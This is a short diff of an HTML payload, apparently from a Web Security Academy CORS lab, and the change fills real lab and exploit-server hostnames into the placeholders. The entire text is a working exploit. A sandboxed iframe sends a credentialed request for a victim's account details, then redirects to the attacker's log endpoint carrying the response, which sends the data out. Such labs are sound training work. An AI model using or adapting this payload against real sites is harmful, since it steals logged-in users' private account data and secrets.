@@ -1,10 +1,10 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.open('get','0a6c005f0449c04680a003ab007f0092.web-security-academy.net/accountDetails',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+        location='https://exploit-0aa800f30420c02680f3025701bd0040.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
